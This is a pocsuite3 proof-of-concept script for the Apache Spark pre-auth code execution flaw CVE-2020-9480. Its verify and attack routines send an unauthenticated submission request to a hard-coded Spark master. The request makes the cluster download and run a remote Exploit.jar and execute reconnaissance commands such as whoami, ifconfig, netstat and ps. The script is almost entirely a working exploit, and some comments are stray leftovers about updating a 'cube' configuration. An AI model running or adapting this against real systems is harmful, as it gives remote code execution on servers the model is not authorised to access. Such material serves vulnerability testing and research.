#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

minimum_version_required('2.0.7')

import requests
import json
from datetime import datetime, timezone



class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'XinJie'
    vulDate = '2022-06-24'
    createDate = '2024-07-24'
    updateDate = '2024-07-24'
    references = ['https://spark.apache.org/security.html#CVE-2020-9480']
    name = 'Apache Spark Apache Spark Pre-Auth Code Execution (CVE-2020-9480)'
    appPowerLink = 'https://spark.apache.org/'
    appName = 'Apache Spark'
    appVersion = '<=2.4.5'
    vulType = 'Code Execution'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    
    def _verify(self):
        # 更新 cube 配置的 API 端点
        update_cube_url = "http://192.168.188.128:6066/v1/submissions/create"
        session = requests.Session()

        json_data0 = {
            "action": "CreateSubmissionRequest",
            "clientSparkVersion": "2.3.1",
            "appArgs": [
                "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
            ],
            "appResource": "",
            "environmentVariables": {
                "SPARK_ENV_LOADED": "1"
            },
            "mainClass": "Exploit",
            "sparkProperties": {
                "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
                "spark.driver.supervise": "false",
                "spark.app.name": "Exploit",
                "spark.eventLog.enabled": "true",
                "spark.submit.deployMode": "cluster",
                "spark.master": "spark://192.168.188.128:6066"
            }
        }

        json_data=json.dumps(json_data0)
        # 发送 POST 请求更新 cube 配置
        update_response = session.post(update_cube_url, headers={'Content-Type': 'application/json'}, data=json_data)
        print(update_response)

        if update_response.ok:
            logger.debug(update_response)
            return update_response


    def _attack(self):
        # 更新 cube 配置的 API 端点
        update_cube_url = "http://192.168.188.128:6066/v1/submissions/create"
        session = requests.Session()

        json_data0 = {
            "action": "CreateSubmissionRequest",
            "clientSparkVersion": "2.3.1",
            "appArgs": [
                "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
            ],
            "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
            "environmentVariables": {
                "SPARK_ENV_LOADED": "1"
            },
            "mainClass": "Exploit",
            "sparkProperties": {
                "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
                "spark.driver.supervise": "false",
                "spark.app.name": "Exploit",
                "spark.eventLog.enabled": "true",
                "spark.submit.deployMode": "cluster",
                "spark.master": "spark://192.168.188.128:6066"
            }
        }

        json_data=json.dumps(json_data0)
        # 发送 POST 请求更新 cube 配置
        update_response = session.post(update_cube_url, headers={'Content-Type': 'application/json'}, data=json_data)
        print(update_response)

        if update_response.ok:
            logger.debug(update_response)
            return update_response

register_poc(DemoPOC)



    


